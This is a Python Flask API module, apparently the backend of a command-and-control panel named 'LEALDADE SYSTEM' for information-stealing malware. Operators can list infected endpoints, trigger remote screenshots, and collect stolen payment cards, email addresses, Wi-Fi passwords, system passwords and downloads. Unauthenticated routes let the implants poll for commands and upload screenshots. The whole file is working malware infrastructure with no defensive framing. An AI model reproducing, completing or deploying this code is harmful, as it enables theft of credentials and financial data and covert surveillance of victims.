from datetime import datetime
from flask import Blueprint, jsonify, request
from .auth import require_login
import store

api_bp = Blueprint('api', __name__)

@api_bp.route('/api/stats', methods=['GET'])
@require_login
def get_stats():
    online = sum(1 for e in store.endpoints.values() if e.get('status') == 'online')
    return jsonify({
        'total_endpoints': len(store.endpoints),
        'online_endpoints': online,
        'total_metrics': len(store.metrics_data)
    })

@api_bp.route('/api/endpoints', methods=['GET'])
@require_login
def get_endpoints():
    return jsonify(list(store.endpoints.values()))

@api_bp.route('/api/metrics', methods=['GET'])
@require_login
def get_metrics_list():
    return jsonify(store.metrics_data)

@api_bp.route('/api/screenshot/<endpoint_id>', methods=['GET'])
@require_login
def get_endpoint_screenshot(endpoint_id):
    s = store.endpoint_screenshots.get(endpoint_id, {})
    return jsonify(s)

@api_bp.route('/api/downloads_data', methods=['GET'])
@require_login
def get_downloads_data():
    all_downloads = []
    for ep_id, ep_data in store.endpoints.items():
        if 'downloads' in ep_data:
            for dl in ep_data['downloads']:
                dl['endpoint_id'] = ep_id
                all_downloads.append(dl)
    return jsonify(all_downloads)

@api_bp.route('/api/cards_data', methods=['GET'])
@require_login
def get_cards_data():
    all_cards = []
    for ep_id, ep_data in store.endpoints.items():
        if 'cards' in ep_data:
            for card in ep_data['cards']:
                card['endpoint_id'] = ep_id
                all_cards.append(card)
    return jsonify(all_cards)

@api_bp.route('/api/emails_data', methods=['GET'])
@require_login
def get_emails_data():
    all_emails = []
    for ep_id, ep_data in store.endpoints.items():
        if 'emails' in ep_data:
            for email in ep_data['emails']:
                all_emails.append({'endpoint_id': ep_id, 'email': email})
    return jsonify(all_emails)

@api_bp.route('/api/wifi_data', methods=['GET'])
@require_login
def get_wifi_data():
    all_wifi = []
    for ep_id, ep_data in store.endpoints.items():
        if 'wifi_passwords' in ep_data:
            for wifi in ep_data['wifi_passwords']:
                wifi['endpoint_id'] = ep_id
                all_wifi.append(wifi)
    return jsonify(all_wifi)

@api_bp.route('/api/system_passwords_data', methods=['GET'])
@require_login
def get_system_passwords_data():
    all_sys_pwd = []
    for ep_id, ep_data in store.endpoints.items():
        if 'system_passwords' in ep_data:
            for pwd in ep_data['system_passwords']:
                pwd['endpoint_id'] = ep_id
                all_sys_pwd.append(pwd)
    return jsonify(all_sys_pwd)

@api_bp.route('/api/system_info_data/<endpoint_id>', methods=['GET'])
@require_login
def get_system_info_data(endpoint_id):
    info = store.endpoint_system_info.get(endpoint_id, {})
    return jsonify(info)

@api_bp.route('/api/screenshot_request/<endpoint_id>', methods=['GET'])
def check_screenshot_request(endpoint_id):
    request_data = store.screenshot_requests.get(endpoint_id, {})
    return jsonify(request_data)

@api_bp.route('/api/request_screenshot/<endpoint_id>', methods=['POST'])
@require_login
def request_screenshot(endpoint_id):
    if endpoint_id not in store.screenshot_requests:
        store.screenshot_requests[endpoint_id] = {
            'request_screenshot': True,
            'timestamp': datetime.now().isoformat()
        }
    return jsonify({'status': 'success', 'message': f'Screenshot solicitado para {endpoint_id}'})

@api_bp.route('/api/screenshot_data', methods=['POST'])
def receive_screenshot():
    data = request.get_json()
    if not data or 'endpoint_id' not in data or 'screenshot' not in data:
        return jsonify({'status': 'error', 'message': 'Dados inválidos'}), 400
    
    endpoint_id = data['endpoint_id']
    screenshot_data = data['screenshot']
    timestamp = data.get('timestamp', datetime.now().isoformat())
    
    # Armazenar screenshot
    if endpoint_id not in store.endpoint_screenshots:
        store.endpoint_screenshots[endpoint_id] = {}
    
    store.endpoint_screenshots[endpoint_id] = {
        'screenshot': screenshot_data,
        'timestamp': timestamp,
        'endpoint_id': endpoint_id
    }
    
    # Limpar solicitação
    if endpoint_id in store.screenshot_requests:
        del store.screenshot_requests[endpoint_id]
    
    return jsonify({'status': 'success', 'message': 'Screenshot recebido'})

@api_bp.route('/api/test')
def test_api():
    return jsonify({
        'status': 'online',
        'server': 'LEALDADE SYSTEM',
        'timestamp': datetime.now().isoformat(),
        'endpoints_count': len(store.endpoints)
    })

@api_bp.route('/api/system_logs', methods=['GET'])
@require_login
def get_system_logs():
    return jsonify(store.system_logs)
